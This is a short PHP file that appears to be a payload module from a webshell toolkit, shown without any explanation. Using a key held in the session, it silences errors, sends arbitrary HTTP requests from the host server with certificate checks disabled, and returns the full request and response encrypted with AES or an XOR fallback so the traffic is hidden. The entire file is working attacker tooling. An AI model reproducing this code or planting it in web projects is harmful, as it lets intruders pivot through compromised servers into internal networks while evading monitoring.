@error_reporting(0);
function main($url,$data='',$type="http"){
    $key = $_SESSION['k'];
    $curl = curl_init();
    $result = array();


    if ($type == "json"){
        $headers = array("Content-type: application/json;charset=UTF-8");
        $data=json_encode($data);
        curl_setopt($curl, CURLOPT_HTTPHEADER, $headers);
    }
    curl_setopt($curl, CURLOPT_URL, $url);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, FALSE);

    if (!empty($data)){
        curl_setopt($curl, CURLOPT_POST, 1);
        curl_setopt($curl, CURLOPT_POSTFIELDS,$data);
    }

    curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($curl,CURLOPT_HEADER,true);
    curl_setopt($curl,CURLINFO_HEADER_OUT,1);

    $output = curl_exec($curl);

    $info=curl_getinfo($curl);

    $reqHeader=$info['request_header'];
    $resHeaderSize=curl_getinfo($curl,CURLINFO_HEADER_SIZE);
    $resHeader=substr($output,0,$resHeaderSize);
    $body=substr($output,$resHeaderSize);

    $result['body']=base64_encode($body);
    $result['resHeader']=base64_encode($resHeader);
    $result['reqHeader']=base64_encode($reqHeader);

    curl_close($curl);
    echo encrypt(json_encode($result),$key);
}

function encrypt($data,$key)
{
	if(!extension_loaded('openssl'))
    	{
    		for($i=0;$i<strlen($data);$i++) {
    			 $data[$i] = $data[$i]^$key[$i+1&15]; 
    			}
			return $data;
    	}
    else
    	{
    		return openssl_encrypt($data, "AES128", $key);
    	}
}